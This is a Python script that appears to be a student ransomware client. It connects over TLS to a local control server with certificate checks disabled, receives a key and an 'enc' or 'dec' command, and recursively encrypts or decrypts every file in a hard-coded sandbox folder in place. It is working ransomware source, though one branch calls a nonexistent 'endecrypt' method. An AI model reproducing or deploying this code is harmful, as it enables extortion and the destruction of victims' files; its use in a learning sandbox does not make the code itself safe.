import ssl
import socket


from cryptography.fernet import Fernet
import base64
import os

LENGTH = 32

def decrypt_file(path , fernet):
    print("decrypting...", path)
    file = open(path, "rb")
    data = file.read()
    if data:
        try:
            file = open(path, "w")
            file.truncate()
            print(type(data) , data)

            decrypted_data = fernet.decrypt(data)

            file.write(decrypted_data.decode())
        except:
            file = open(path, "wb")
            file.truncate()
            print(type(data) , data)

            decrypted_data = fernet.decrypt(data)

            file.write(decrypted_data)
def encrypt_file(path , fernet):
    print("encrypting...", path)
    file = open(path, "rb")
    data = file.read()
    if data:
        try:
            file = open(path, "w")
            file.truncate()
            print(type(data), data)

            encrypted_data = fernet.encrypt(data)

            file.write(encrypted_data.decode())
        except:
            file = open(path, "wb")
            file.truncate()
            print(type(data), data)

            encrypted_data = fernet.endecrypt(data)

            file.write(encrypted_data)
def create_key(secret):
    return base64.urlsafe_b64encode(secret)
def browse_all_files(path , fernet , reverse):
    if path:
        print("checking ,",path)
        if(os.path.isfile(path)):
            if(reverse == False):
                encrypt_file(path,fernet)
            else:
                decrypt_file(path , fernet)

        elif(os.path.isdir(path)):
            list_dir = os.listdir(path)
            for filename in list_dir:
                browse_all_files(path+"/"+filename , fernet , reverse)



def main():

    try:
        #path =  os.getcwd()[:3]
        path =r"C:\Users\User\OneDrive\Desktop\לימודים\מועדון המתכנתים\sandbox"
        print(os.listdir(path))
        print(path)
        context = ssl.SSLContext(protocol=ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        ssl_socket = context.wrap_socket(client_socket, server_hostname="none")
        context.set_ciphers("ALL:@SECLEVEL=0")

        while True:
            try:
                ssl_socket.connect(("127.0.0.1", 8889))
                break
            except:
                pass


        secret = ssl_socket.recv(LENGTH)
        command = ssl_socket.recv(3).decode()
        print(command)
        print(secret)
        key = create_key(secret)
        fernet = Fernet(key)
        secret = None
        reverse = False
        if(command == 'dec'):
            reverse = True

        browse_all_files(path,fernet , reverse=reverse)
        print("all file are now: {}rypted".format(command))

    except Exception as e:
        print(e)
if __name__ == "__main__":
    main()